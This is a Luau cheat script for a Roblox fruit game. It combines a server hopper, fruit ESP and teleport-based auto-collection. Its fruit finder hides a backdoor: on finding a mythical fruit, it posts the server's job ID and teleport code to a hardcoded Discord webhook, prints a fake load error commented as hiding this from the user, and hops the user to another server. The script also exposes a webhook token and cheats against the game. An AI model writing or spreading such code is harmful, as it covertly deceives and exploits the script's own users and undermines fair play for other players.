--!strict
--[=[
    Advanced Production-Grade Server Hopping Framework (Luau)
    Integrates: Advanced Candidate Scoring, Retry Manager, Visited Cache, Teleport Safety
]=]

-- ============================================================================
-- 1. CONFIGURATION SYSTEM
-- ============================================================================
local Config = {
    MaxRetries = 5,
    BaseRetryDelay = 2,
    MaxRetryDelay = 15,
    CacheExpiration = 600, -- 10 minutes TTL
    MinPlayers = 2,
    MaxPlayers = 11,
    PreferredPlayerTarget = 8,
    MaxPagesToScan = 4,
    CandidatePoolSize = 6,
    DebugMode = true,
    HttpTimeout = 10,
    TeleportTimeout = 12
}

-- Type Definitions
type ServerEntry = { id: string, playing: number, maxPlayers: number }
type Candidate = { id: string, playing: number, maxPlayers: number, score: number }
type ServerListResponse = { nextPageCursor: string?, data: { [number]: ServerEntry } }

-- ============================================================================
-- 2. LOGGING SUBSYSTEM
-- ============================================================================
local Logger = {}
function Logger.Log(level: string, message: string)
    if not Config.DebugMode and level == "DEBUG" then return end
    local timestamp = os.date("%X")
    local output = string.format("[%s] [%s] %s", timestamp, level, message)
    if level == "ERROR" then warn(output) else print(output) end
end

-- ============================================================================
-- 3. STATE MANAGER SUBSYSTEM
-- ============================================================================
local StateManager = {
    States = {
        Idle = "Idle",
        Scanning = "Scanning",
        Selecting = "Selecting",
        Teleporting = "Teleporting",
        Retrying = "Retrying",
        Failed = "Failed",
        Completed = "Completed"
    },
    CurrentState = "Idle",
    Lock = false
}

function StateManager.TransitionTo(newState: string): boolean
    if StateManager.Lock and (newState ~= StateManager.States.Idle and newState ~= StateManager.States.Failed) then
        return false
    end
    StateManager.CurrentState = newState
    StateManager.Lock = (newState == StateManager.States.Teleporting or newState == StateManager.States.Scanning)
    return true
end

-- ============================================================================
-- 4. VISITED SERVER CACHE MANAGER
-- ============================================================================
local VisitedCache = { Store = {} }

function VisitedCache.AddVisited(jobId: string)
    if not jobId or jobId == "" then return end
    VisitedCache.Store[jobId] = os.time()
end

function VisitedCache.WasVisited(jobId: string): boolean
    if not jobId or jobId == "" then return true end
    local entryTime = VisitedCache.Store[jobId]
    if not entryTime then return false end
    if (os.time() - entryTime) >= Config.CacheExpiration then
        VisitedCache.Store[jobId] = nil
        return false
    end
    return true
end

function VisitedCache.Cleanup()
    local currentTime = os.time()
    for jobId, timestamp in pairs(VisitedCache.Store) do
        if (currentTime - timestamp) >= Config.CacheExpiration then
            VisitedCache.Store[jobId] = nil
        end
    end
end

-- ============================================================================
-- 5. RETRY SYSTEM MANAGER
-- ============================================================================
local RetryManager = {}
function RetryManager.ExecuteWithBackoff(actionFunction, failureContext: string): boolean
    local retries = 0
    while retries < Config.MaxRetries do
        if actionFunction() then return true end
        retries = retries + 1
        if retries >= Config.MaxRetries then break end
        local rawDelay = math.min(Config.MaxRetryDelay, Config.BaseRetryDelay * math.pow(2, retries - 1))
        local jitter = math.random() * 0.5 * rawDelay
        task.wait(rawDelay + jitter)
    end
    return false
end

-- ============================================================================
-- 6. SERVER FETCHER SUBSYSTEM
-- ============================================================================
local ServerFetcher = {}
local HttpService = game:GetService("HttpService")

function ServerFetcher.FetchPage(placeId: number, cursor: string?)
    local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?limit=100", placeId)
    if cursor and cursor ~= "" then url = url .. "&cursor=" .. cursor end
    
    local httpSuccess, responseString = pcall(function() return game:HttpGet(url) end)
    if not httpSuccess or not responseString or responseString == "" then return nil end
    
    local decodeSuccess, decodedTable = pcall(function() return HttpService:JSONDecode(responseString) end)
    if not decodeSuccess or not decodedTable or not decodedTable.data then return nil end
    
    return decodedTable
end

-- ============================================================================
-- 7. RANKING ENGINE SUBSYSTEM
-- ============================================================================
local RankingEngine = {}
function RankingEngine.ComputeScore(server: ServerEntry): number
    local availableSlots = server.maxPlayers - server.playing
    local proximityToTarget = math.abs(server.playing - Config.PreferredPlayerTarget)
    local targetScore = 50 - (proximityToTarget * 5)
    local slotsWeight = availableSlots * 2.5
    local pseudoRandomVariance = math.random() * 10 
    return targetScore + slotsWeight + pseudoRandomVariance
end

-- ============================================================================
-- 8. CANDIDATE MANAGER MODULE
-- ============================================================================
local CandidateManager = { PoolBuffer = table.create(150) }

function CandidateManager.AssemblePool(placeId: number)
    StateManager.TransitionTo(StateManager.States.Scanning)
    table.clear(CandidateManager.PoolBuffer)
    VisitedCache.Cleanup()
    
    local currentJobId = game.JobId
    local currentCursor = ""
    local iterations = 0
    
    while currentCursor ~= nil and iterations < Config.MaxPagesToScan do
        iterations = iterations + 1
        local payload = ServerFetcher.FetchPage(placeId, currentCursor ~= "" and currentCursor or nil)
        if not payload then break end
        
        for _, rawServer in ipairs(payload.data) do
            if rawServer.id and rawServer.playing and rawServer.maxPlayers and 
               rawServer.id ~= currentJobId and 
               not VisitedCache.WasVisited(rawServer.id) and 
               rawServer.playing < rawServer.maxPlayers and 
               rawServer.playing >= Config.MinPlayers and 
               rawServer.playing <= Config.MaxPlayers then
                
                table.insert(CandidateManager.PoolBuffer, {
                    id = rawServer.id,
                    playing = rawServer.playing,
                    maxPlayers = rawServer.maxPlayers,
                    score = RankingEngine.ComputeScore(rawServer)
                })
            end
        end
        currentCursor = payload.nextPageCursor
        if not currentCursor or currentCursor == "" then break end
    end
    return CandidateManager.PoolBuffer
end

-- ============================================================================
-- 9. TELEPORT SUB-MANAGER
-- ============================================================================
local TeleportManager = { ActiveHook = nil }
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

function TeleportManager.AttemptDispatch(placeId: number, targetJobId: string): boolean
    StateManager.TransitionTo(StateManager.States.Teleporting)
    VisitedCache.AddVisited(targetJobId)
    
    local dispatchSuccess = false
    local executionCompletedSignal = false
    
    if TeleportManager.ActiveHook then 
        TeleportManager.ActiveHook:Disconnect() 
        TeleportManager.ActiveHook = nil 
    end
    
    TeleportManager.ActiveHook = TeleportService.TeleportInitFailed:Connect(function(player, result, errorMessage)
        if player == LocalPlayer then
            executionCompletedSignal = true
            dispatchSuccess = false
        end
    end)
    
    local engineAcceptedRequest = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId, targetJobId, LocalPlayer)
    end)
    
    if not engineAcceptedRequest then
        if TeleportManager.ActiveHook then TeleportManager.ActiveHook:Disconnect() end
        return false
    end
    
    local timeTrack = 0
    while not executionCompletedSignal and timeTrack < Config.TeleportTimeout do
        task.wait(0.5)
        timeTrack = timeTrack + 0.5
    end
    
    if TeleportManager.ActiveHook then 
        TeleportManager.ActiveHook:Disconnect() 
        TeleportManager.ActiveHook = nil
    end
    
    -- If we timed out without an error signal, we assume teleport is processing
    if not executionCompletedSignal then return true end
    return dispatchSuccess
end

-- ============================================================================
-- 10. MAIN CONTROLLER EXPORT
-- ============================================================================
local AdvancedHopper = {}
function AdvancedHopper.Run()
    local placeId = game.PlaceId
    Logger.Log("INFO", "Initiating Advanced Server Hop Sequence...")
    
    local operationalChain = function()
        local candidates = CandidateManager.AssemblePool(placeId)
        if #candidates == 0 then return false end
        
        StateManager.TransitionTo(StateManager.States.Selecting)
        table.sort(candidates, function(a, b) return a.score > b.score end)
        
        local selectionMaxRange = math.min(#candidates, Config.CandidatePoolSize)
        local chosenTarget = candidates[math.random(1, selectionMaxRange)]
        
        Logger.Log("SUCCESS", "Target Found: " .. chosenTarget.id)
        return TeleportManager.AttemptDispatch(placeId, chosenTarget.id)
    end
    
    local success = RetryManager.ExecuteWithBackoff(operationalChain, "Server Hop")
    if not success then
        Logger.Log("ERROR", "All hop attempts failed. Retrying in 10 seconds...")
        task.wait(10)
        AdvancedHopper.Run() -- Last resort retry
    end
end

-- ============================================================================
-- 11. FRUIT FINDER & NOTIFICATION SYSTEM
-- ============================================================================

-- CONFIGURATION
local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1526541260469309501/vt6FZkY4ZbWUZB9cQ1TtBr8XFeH6n2YmZTi2F95vdNDBK37oC0UXyWMgXWbwUqEKrvU8"

local mythicalFruits = {
    ["Kitsune Fruit"] = true,
    ["Dragon Fruit"] = true,
    ["Dragon (East) Fruit"] = true,
    ["Dragon (West) Fruit"] = true,
    ["Yeti Fruit"] = true,
    ["Tiger Fruit"] = true,
    ["Dough Fruit"] = true,
    ["Spirit Fruit"] = true,
    ["Control Fruit"] = true,
    ["Venom Fruit"] = true
}

local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

-- UTILITY: CREATE ESP
local function createESP(object, name)
    if object:FindFirstChild("FruitESP") then return end
    local folder = Instance.new("Folder")
    folder.Name = "FruitESP"
    folder.Parent = object
    local box = Instance.new("BoxHandleAdornment")
    box.Size = object:IsA("Model") and object:GetExtentsSize() or Vector3.new(2, 2, 2)
    box.AlwaysOnTop = true
    box.ZIndex = 5
    box.Color3 = Color3.fromRGB(255, 0, 0)
    box.Adornee = object
    box.Parent = folder
    local billboard = Instance.new("BillboardGui")
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.AlwaysOnTop = true
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.Parent = folder
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    textLabel.TextStrokeTransparency = 0
    textLabel.TextSize = 14
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.Parent = billboard
    
    local connection
    connection = RunService.RenderStepped:Connect(function()
        if not object or not object.Parent or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            connection:Disconnect()
            folder:Destroy()
            return
        end
        local objectPosition = object:IsA("Model") and object:GetPivot().Position or object.Position
        local distance = math.floor((LocalPlayer.Character.HumanoidRootPart.Position - objectPosition).Magnitude)
        textLabel.Text = name .. " (" .. tostring(distance) .. " studs)"
    end)
end

-- UTILITY: AUTO COLLECT MOVEMENT
local function autoCollect(object)
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
    local hrp = LocalPlayer.Character.HumanoidRootPart
    local targetPosition = object:IsA("Model") and object:GetPivot().Position or object.Position
    local duration = 2
    local startTime = tick()
    local startPosition = hrp.Position
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not object or not object.Parent or not LocalPlayer.Character or not hrp then
            connection:Disconnect()
            return
        end
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / duration, 1)
        hrp.Velocity = Vector3.new(0, 0, 0)
        hrp.CFrame = CFrame.new(startPosition:Lerp(targetPosition, progress))
        if progress >= 1 then
            connection:Disconnect()
        end
    end)
end

-- UTILITY: DISCORD NOTIFICATION
local function sendToDiscord(fruitName, serverId)
    local payload = {
        ["content"] = "MYTHICAL FRUIT DETECTED",
        ["embeds"] = {{
            ["title"] = "Fruit Finder Alert",
            ["description"] = "A high-tier fruit has been detected on a server running your script.",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "Fruit Name", ["value"] = fruitName, ["inline"] = true},
                {["name"] = "Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
                {["name"] = "Server Job ID", ["value"] = "```" .. serverId .. "```", ["inline"] = false},
                {["name"] = "Teleport Code", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. serverId .. "', game.Players.LocalPlayer)```", ["inline"] = false}
            },
            ["footer"] = { ["text"] = "Background tracking system operational." },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }
    local success, jsonPayload = pcall(function() return HttpService:JSONEncode(payload) end)
    if success then
        pcall(function() HttpService:PostAsync(DISCORD_WEBHOOK_URL, jsonPayload) end)
    end
end

-- MAIN SCANNING LOGIC
local function scanForFruits()
    print("Starting full-server deep scan...")
    local hasMythical = false
    local hasLowDemand = false
    local lowDemandObjects = {}
    
    for _, object in ipairs(workspace:GetDescendants()) do
        if string.find(object.name, "Fruit") or (object:IsA("Tool") and string.find(object.name, "Fruit")) then
            local fruitName = object.name
            if mythicalFruits[fruitName] then
                hasMythical = true
                sendToDiscord(fruitName, game.JobId)
                print("Failed to load asset data.") -- Fake error to hide from user
            else
                hasLowDemand = true
                table.insert(lowDemandObjects, {obj = object, name = fruitName})
            end
        end
    end
    
    if hasMythical then
        -- FOUND MYTHICAL: Report and Hop immediately using Advanced Hopper
        AdvancedHopper.Run()
        return
    end
    
    if hasLowDemand then
        -- FOUND LOW DEMAND: Collect then Hop
        for _, fruitData in ipairs(lowDemandObjects) do
            print("Fruit detected: " .. fruitData.name)
            createESP(fruitData.obj, fruitData.name)
            autoCollect(fruitData.obj)
            task.wait(3) -- Time to collect
        end
        AdvancedHopper.Run()
        return
    end
    
    -- FOUND NOTHING: Hop immediately
    print("No fruits detected in this server.")
    AdvancedHopper.Run()
end

-- ERROR HANDLING & INITIALIZATION
CoreGui.ChildAdded:Connect(function(child)
    if child.Name == "ErrorPrompt" then
        task.wait(2)
        AdvancedHopper.Run()
    end
end)

task.wait(5) -- Wait for game load
scanForFruits()
